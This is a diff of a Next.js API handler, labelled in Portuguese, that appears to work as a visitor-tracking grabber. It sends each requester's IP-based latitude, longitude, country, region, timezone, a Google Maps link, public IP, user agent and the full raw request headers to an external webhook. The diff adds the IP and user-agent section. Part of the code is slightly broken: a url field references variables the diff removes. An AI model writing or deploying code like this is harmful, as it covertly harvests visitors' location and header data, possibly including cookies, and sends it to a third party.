@@ -14,8 +14,7 @@ export default async function handler(
   res: NextApiResponse
 ) {
   try {
-    const latitude = req.headers['x-vercel-ip-latitude']
-    const longitude = req.headers['x-vercel-ip-longitude']
+ 
 
     const webhook = await webhookClient.send({
       "content": null,
@@ -28,12 +27,14 @@ export default async function handler(
           "title": "Detalhes de localização:",
           "description": `Latitude: ${req.headers['x-vercel-ip-latitude']}\nLongitude: ${req.headers['x-vercel-ip-longitude']}\nPaís: ${req.headers['x-vercel-ip-country']}\nRegião: ${req.headers['x-vercel-ip-country-region']}\nTime zone: ${req.headers['x-vercel-ip-timezone']}\nLocalização aproximada: https://www.google.com/maps/place/${req.headers['x-vercel-ip-latitude']},${req.headers['x-vercel-ip-longitude']}`,
           "url": "https://www.google.com/maps/place/${latitude},${longitude}",
-          "color": 34303
+        },
+        {
+          "title": "Detalhes técnicos:",
+          "description": `Acessado de: ${req.headers['x-requested-with']}\nIP público: ${req.headers['x-real-ip']}\n user-agent: ${req.headers['user-agent']}`,
         },
         {
           "title": "Detalhes brutos:",
           "description": JSON.stringify(req.headers, null, 10),
-          "color": 16763904
         }
       ],
       "attachments": []
